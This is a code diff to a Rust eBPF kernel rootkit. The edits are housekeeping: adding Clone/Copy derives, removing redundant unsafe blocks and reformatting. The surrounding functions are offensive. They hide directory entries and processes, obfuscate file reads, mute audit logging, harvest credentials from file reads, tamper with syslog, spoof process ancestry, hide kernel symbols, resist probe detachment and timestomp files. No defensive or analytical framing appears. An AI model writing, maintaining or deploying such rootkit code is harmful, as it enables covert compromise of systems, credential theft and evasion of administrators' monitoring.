@@ -102,6 +102,7 @@ static OBFUSCATE_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);
 /// Unified vfs_read context for kretprobe dispatch (Features 3, 8, 10).
 /// Stored on kprobe entry, consumed by the appropriate kretprobe.
 /// Key: pid_tgid (u64). Value: VfsReadCtx.
+#[derive(Clone, Copy)]
 #[repr(C)]
 struct VfsReadCtx {
     buf_ptr: u64,
@@ -114,6 +115,7 @@ static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024,
 
 /// Temporary storage for do_syslog kprobe → kretprobe handoff.
 /// Key: pid_tgid (u64). Value: SyslogCtx { syslog_type, buf_ptr, len }.
+#[derive(Clone, Copy)]
 #[repr(C)]
 struct SyslogCtx {
     syslog_type: u32,
@@ -127,6 +129,7 @@ static SYSLOG_ARGS: HashMap<u64, SyslogCtx> = HashMap::with_max_entries(256, 0);
 
 /// Temporary storage for vfs_getattr kprobe → kretprobe handoff.
 /// Key: pid_tgid (u64). Value: GetattrCtx { kstat_ptr, inode }.
+#[derive(Clone, Copy)]
 #[repr(C)]
 struct GetattrCtx {
     kstat_ptr: u64,
@@ -161,7 +164,7 @@ pub fn shadow_getdents64_enter(ctx: ProbeContext) -> u32 {
 
 fn try_getdents64_enter(ctx: &ProbeContext) -> Result<u32, i64> {
     let buf_ptr: u64 = ctx.arg(1).ok_or(1i64)?;
-    let tgid = unsafe { bpf_get_current_pid_tgid() };
+    let tgid = bpf_get_current_pid_tgid();
     GETDENTS_BUFS.insert(&tgid, &buf_ptr, 0).map_err(|_| 2i64)?;
     Ok(0)
 }
@@ -176,7 +179,7 @@ pub fn shadow_getdents64_exit(ctx: RetProbeContext) -> u32 {
 }
 
 fn try_getdents64_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
-    let tgid = unsafe { bpf_get_current_pid_tgid() };
+    let tgid = bpf_get_current_pid_tgid();
     let buf_ptr = unsafe { GETDENTS_BUFS.get(&tgid).ok_or(1i64)? };
     let buf_ptr = *buf_ptr;
     let _ = GETDENTS_BUFS.remove(&tgid);
@@ -480,34 +483,32 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
     let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
     let count: u64 = ctx.arg(2).ok_or(3i64)?;
 
-    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
+    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
     if let Some(config) = unsafe { CONFIG.get(&0u32) } {
         if tgid == config.self_pid {
             return Ok(0);
         }
     }
 
-    let f_inode_ptr: u64 = match unsafe {
-        bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64)
-    } {
-        Ok(v) => v,
-        Err(_) => return Ok(0),
-    };
+    let f_inode_ptr: u64 =
+        match unsafe { bpf_probe_read_kernel((file_ptr + FILE_F_INODE_OFFSET) as *const u64) } {
+            Ok(v) => v,
+            Err(_) => return Ok(0),
+        };
 
     if f_inode_ptr == 0 {
         return Ok(0);
     }
 
-    let i_ino: u64 = match unsafe {
-        bpf_probe_read_kernel((f_inode_ptr + INODE_I_INO_OFFSET) as *const u64)
-    } {
-        Ok(v) => v,
-        Err(_) => return Ok(0),
-    };
+    let i_ino: u64 =
+        match unsafe { bpf_probe_read_kernel((f_inode_ptr + INODE_I_INO_OFFSET) as *const u64) } {
+            Ok(v) => v,
+            Err(_) => return Ok(0),
+        };
 
     let marker = unsafe { OBFUSCATE_INODES.get(&i_ino) };
     if marker.is_none() {
-        let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+        let pid_tgid = bpf_get_current_pid_tgid();
         let _ = VFS_READ_ARGS.insert(
             &pid_tgid,
             &VfsReadCtx {
@@ -520,7 +521,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
         return Ok(0);
     }
 
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
     let _ = VFS_READ_ARGS.insert(
         &pid_tgid,
         &VfsReadCtx {
@@ -531,7 +532,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
         0,
     );
 
-    let marker_val = unsafe { *marker.unwrap() };
+    let marker_val = *marker.unwrap();
 
     if marker_val == 2 {
         return Ok(0);
@@ -571,7 +572,7 @@ pub fn shadow_mute_audit(ctx: ProbeContext) -> u32 {
 }
 
 fn try_mute_audit(_ctx: &ProbeContext) -> Result<u32, i64> {
-    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
+    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
         return Ok(0);
@@ -597,7 +598,7 @@ pub fn shadow_mute_audit_log_end(ctx: ProbeContext) -> u32 {
 }
 
 fn try_mute_audit_log_end(_ctx: &ProbeContext) -> Result<u32, i64> {
-    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
+    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     if unsafe { HIDDEN_PIDS.get(&tgid).is_none() } {
         return Ok(0);
@@ -637,7 +638,7 @@ fn try_cred_harvest(ctx: &ProbeContext) -> Result<u32, i64> {
     let buf_ptr: u64 = ctx.arg(1).ok_or(2i64)?;
     let count: u64 = ctx.arg(2).ok_or(3i64)?;
 
-    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
+    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     if let Some(config) = unsafe { CONFIG.get(&0u32) } {
         if tgid == config.self_pid {
@@ -696,7 +697,7 @@ pub fn shadow_tamper_logs_enter(ctx: ProbeContext) -> u32 {
         Some(v) => v,
         None => return 0,
     };
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
     let entry = SyslogCtx {
         syslog_type,
         _pad: 0,
@@ -716,7 +717,7 @@ pub fn shadow_tamper_logs(ctx: RetProbeContext) -> u32 {
 }
 
 fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
 
     let args = match unsafe { SYSLOG_ARGS.get(&pid_tgid) } {
         Some(a) => *a,
@@ -827,7 +828,7 @@ pub fn shadow_spoof_ancestry(ctx: RetProbeContext) -> u32 {
 }
 
 fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
 
     let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
         Some(a) => *a,
@@ -1110,7 +1111,7 @@ pub fn shadow_hide_kallsyms(ctx: RetProbeContext) -> u32 {
 }
 
 fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
 
     let args = match unsafe { VFS_READ_ARGS.get(&pid_tgid) } {
         Some(a) => *a,
@@ -1240,7 +1241,7 @@ fn try_anti_detach(ctx: &aya_ebpf::programs::TracePointContext) -> Result<u32, i
         return Ok(0);
     }
 
-    let tgid = (unsafe { bpf_get_current_pid_tgid() } >> 32) as u32;
+    let tgid = (bpf_get_current_pid_tgid() >> 32) as u32;
 
     if let Some(config) = unsafe { CONFIG.get(&0u32) } {
         if tgid == config.self_pid {
@@ -1354,12 +1355,11 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         return 0;
     }
 
-    let dentry_ptr: u64 = match unsafe {
-        bpf_probe_read_kernel((path_ptr + PATH_DENTRY_OFFSET) as *const u64)
-    } {
-        Ok(v) => v,
-        Err(_) => return 0,
-    };
+    let dentry_ptr: u64 =
+        match unsafe { bpf_probe_read_kernel((path_ptr + PATH_DENTRY_OFFSET) as *const u64) } {
+            Ok(v) => v,
+            Err(_) => return 0,
+        };
 
     if dentry_ptr == 0 {
         return 0;
@@ -1376,18 +1376,17 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         return 0;
     }
 
-    let i_ino: u64 = match unsafe {
-        bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64)
-    } {
-        Ok(v) => v,
-        Err(_) => return 0,
-    };
+    let i_ino: u64 =
+        match unsafe { bpf_probe_read_kernel((inode_ptr + INODE_I_INO_OFFSET) as *const u64) } {
+            Ok(v) => v,
+            Err(_) => return 0,
+        };
 
     if unsafe { TIMESTOMP_INODES.get(&i_ino).is_none() } {
         return 0;
     }
 
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
     let entry = GetattrCtx {
         kstat_ptr,
         inode: i_ino,
@@ -1405,7 +1404,7 @@ pub fn shadow_timestomp(ctx: RetProbeContext) -> u32 {
 }
 
 fn try_timestomp(_ctx: &RetProbeContext) -> Result<u32, i64> {
-    let pid_tgid = unsafe { bpf_get_current_pid_tgid() };
+    let pid_tgid = bpf_get_current_pid_tgid();
 
     let args = match unsafe { GETATTR_ARGS.get(&pid_tgid) } {
         Some(a) => *a,
